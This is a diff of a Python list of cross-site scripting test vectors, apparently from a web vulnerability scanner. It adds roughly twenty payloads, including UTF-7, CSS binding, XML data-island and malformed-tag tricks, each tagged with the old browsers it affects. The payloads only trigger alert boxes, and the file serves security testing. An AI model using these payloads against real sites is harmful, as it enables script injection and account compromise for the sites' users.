@@ -30,7 +30,7 @@ Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 vectors = [
 		
-		{ 'payload':"""<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>""",
+		{ 'payload':"""<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS");>""",
 		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
 
 		{ 'payload':""""><img src=x onerror=alert(XSS);>""",
@@ -69,21 +69,21 @@ vectors = [
 		{ 'payload':"""<IMG SRC="jav&#x0D;ascript:alert('XSS');">""",
 		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
 
-		 #{ 'payload':#"""<IMG\nSRC\n=\n"\nj\na\nv\na\ns\nc\nr\ni\np\nt\n:\n"""+
-		 #     """a\nl\ne\nr\nt\n(\n'\n"""+
-		 #     """X\nS\nS\n'\n"""+
-		 #     """)\n"\n>""",
-		 # 'browser':"""[|IE6.0|NS8.1-IE] [O9.02]"""},
+		#{ 'payload':"""<IMG\nSRC\n=\n"\nj\na\nv\na\ns\nc\nr\ni\np\nt\n:\n"""+
+		#      """a\nl\ne\nr\nt\n(\n'\n"""+
+		#      """X\nS\nS\n'\n"""+
+		#      """)\n"\n>""",
+		#  'browser':"""[|IE6.0|NS8.1-IE] [O9.02]"""},
 
-		{ 'payload':"""perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out""",
-  		  'browser':"""[IE7.0|IE6.0|NS8.1-IE]"""},
+		#{ 'payload':"""perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out""",
+  		#  'browser':"""[IE7.0|IE6.0|NS8.1-IE]"""},
 		
 		{ 'payload':"""<IMG SRC=" &#14;  javascript:alert('XSS');">""",
 	          'browser':"""[IE6.0|NS8.1-IE]"""},
-		
-		{ 'payload':"""<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>""",
-		  'browser':"""[NS8.1-G|FF2.0]"""},
-		
+
+		{ 'payload':"""<DIV STYLE="behaviour: url(javascript:alert('XSS'));">""",
+		  'browser':"""[IE6.0|NS8.1-IE]"""},
+
                 { 'payload':"""<<SCRIPT>alert("XSS");//<</SCRIPT>""",
 		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
 
@@ -96,7 +96,7 @@ vectors = [
                 { 'payload':"""<SCRIPT>alert(/XSS/.source)</SCRIPT>""",
 		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
 
-		{ 'payload':"""<BODY BACKGROUND="javascript:alert('XSS')">""",
+		{ 'payload':"""<BODY BACKGROUND="javascript:alert('XSS');">""",
 		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},
 
                 { 'payload':"""</TITLE><SCRIPT>alert("XSS");</SCRIPT>""",
@@ -105,13 +105,13 @@ vectors = [
 		{ 'payload':"""<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">""",
 		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},
 
-                { 'payload':"""<BODY ONLOAD=alert('XSS')>""",
+                { 'payload':"""<BODY ONLOAD=alert('XSS');>""",
 	          'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
 
-		{ 'payload':"""<IMG DYNSRC="javascript:alert('XSS')">""",
+		{ 'payload':"""<IMG DYNSRC="javascript:alert('XSS');">""",
 		  'browser':"""[IE6.0|NS8.1-IE]"""},
 
-		{ 'payload':"""<IMG LOWSRC="javascript:alert('XSS')">""",
+		{ 'payload':"""<IMG LOWSRC="javascript:alert('XSS');">""",
 		  'browser':"""[IE6.0|NS8.1-IE]"""},
 
 		{ 'payload':"""<BGSOUND SRC="javascript:alert('XSS');">""",
@@ -123,7 +123,7 @@ vectors = [
 		{ 'payload':"""<LINK REL="stylesheet" HREF="javascript:alert('XSS');">""",
 		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},
 		#30##
-		{ 'payload':"""<IMG SRC='vbscript:msgbox("XSS")'>""",
+		{ 'payload':"""<IMG SRC='vbscript:msgbox("XSS");'>""",
 	   	  'browser':"""[IE6.0|NS8.1-IE]"""},
 	 
 		{ 'payload':"""<IMG SRC="mocha:[XSS]">""",
@@ -135,13 +135,13 @@ vectors = [
 	 	{ 'payload':"""<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">""",
 	   	  'browser':"""[IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
 
-	 	{ 'payload':"""<TABLE BACKGROUND="javascript:alert('XSS')">""",
+	 	{ 'payload':"""<TABLE BACKGROUND="javascript:alert('XSS');">""",
 	          'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},
 
-		{ 'payload':"""<TABLE><TD BACKGROUND="javascript:alert('XSS')">""",
+		{ 'payload':"""<TABLE><TD BACKGROUND="javascript:alert('XSS');">""",
 		  'browser':"""[IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
 
-		{ 'payload':"""<DIV STYLE="background-image: url(javascript:alert('XSS'))">""",
+		{ 'payload':"""<DIV STYLE="background-image: url(javascript:alert('XSS'));">""",
 		  'browser':"""[IE6.0|NS8.1-IE]"""},			  
 		
 		{ 'payload':"""<DIV STYLE="width: expression(alert('XSS'));">""",
@@ -178,7 +178,7 @@ vectors = [
 		  'browser':"""[IE7.0|IE6.0|NS8.1-IE]"""},			  
 		
 		#{ 'payload':"""exp/*<A STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>""",
-		 # 'browser':"""[IE7.0|IE6.0|NS8.1-IE]"""},
+		#  'browser':"""[IE7.0|IE6.0|NS8.1-IE]"""},
 		#50#
    		{ 'payload':"""<STYLE TYPE="text/javascript">alert('XSS');</STYLE>""",
 		  'browser':"""[NS4]"""},
@@ -243,4 +243,82 @@ vectors = [
 		#{ 'payload':"""<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">""",
 		#  'browser':"""[IE6.0|NS8.1-IE]"""},
 
-	]
+		{ 'payload':"""<IMG SRC="&14;javascript:alert('XSS');">""",
+		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},
+	
+		{ 'payload':"""<SCRIPT <B>=alert('XSS');"></SCRIPT>""",
+		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},	 
+
+		{ 'payload':"""<IFRAME SRC="javascript:alert('XSS'); <""",
+		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
+
+		{ 'payload':"""<SCRIPT>a=/XSS/nalert('XSS');</SCRIPT>""",
+		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
+
+		{ 'payload':"""<LAYER SRC="javascript:alert('XSS');></LAYER>""",
+		  'browser':"""[NS4]"""},
+	
+		{ 'payload':"""<STYLE>li {list-style-image: url("javascript:alert('XSS');</STYLE><UL><LI>XSS""", 
+		  'browser':"""[IE6.0|NS8.1-IE]"""},
+
+		{ 'payload':"""<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'));">""",
+		  'browser':"""[IE6.0|NS8.1-IE]"""},
+		#80
+		{ 'payload':"""<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"></HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-""",
+		  'browser':"""[IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
+
+		{ 'payload':"""<a href="javascript#alert('XSS');">""",
+		  'browser':"""[IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
+
+		{ 'payload':"""<div onmouseover="alert('XSS');">""",
+		  'browser':"""[IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
+
+		{ 'payload':"""<input type="image" dynsrc="javascript:alert('XSS');">""",
+		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},
+
+		{ 'payload':"""&<script>alert('XSS');</script>">""",
+		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
+
+		{ 'payload':"""&{alert('XSS');};""",
+		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
+
+		{ 'payload':"""<IMG SRC=&{alert('XSS');};>""",
+		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},
+
+		{ 'payload':"""<a href="about:<script>alert('XSS');</script>">""",
+		  'browser':"""[IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
+
+		{ 'payload':"""<DIV STYLE="binding: url(javascript:alert('XSS'));">""",
+		  'browser':"""[IE6.0|NS8.1-IE]"""},
+
+		{ 'payload':"""<OBJECT classid=clsid:..." codebase="javascript:alert('XSS');">""",
+		  'browser':"""[O9.02]"""},
+
+		{ 'payload':"""<style><!--</style><script>alert('XSS');//--></script>""",
+		  'browser':"""[IE6.0|NS8.1-IE]"""},
+		#90
+		{ 'payload':"""![CDATA[<!--]]<script>alert('XSS');//--></script>""",
+		  'browser':"""[IE6.0|NS8.1-IE]"""},
+
+		{ 'payload':"""<!-- -- --><script>alert('XSS');</script><!-- -- -->""",
+		  'browser':"""[Not Info]"""},
+
+		{ 'payload':"""<img src="blah"onmouseover="alert('XSS');">""",
+		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},
+
+		{ 'payload':"""<img src="blah>"onmouseover="alert('XSS');">""",
+		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},
+		
+		{ 'payload':"""<xml id="X"><a><b><script>alert('XSS');</script>;<b></a></xml>""",
+		  'browser':"""[IE6.0|NS8.1-IE]"""},
+
+		{ 'payload':"""<div datafld="b" dataformatas="html" datasrc="#XSS"></div>""",
+		  'browser':"""[Not Info]"""},
+
+		{ 'payload':"""[\xC0][\xBC]script>alert('XSS');[\xC0][\xBC]/script>""",
+		  'browser':"""[Not Info]"""},	
+
+		{ 'payload':"""<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:alert('XSS');">]]</C><X></xml>""",
+		  'browser':"""[IE6.0|NS8.1-IE]"""},
+
+]
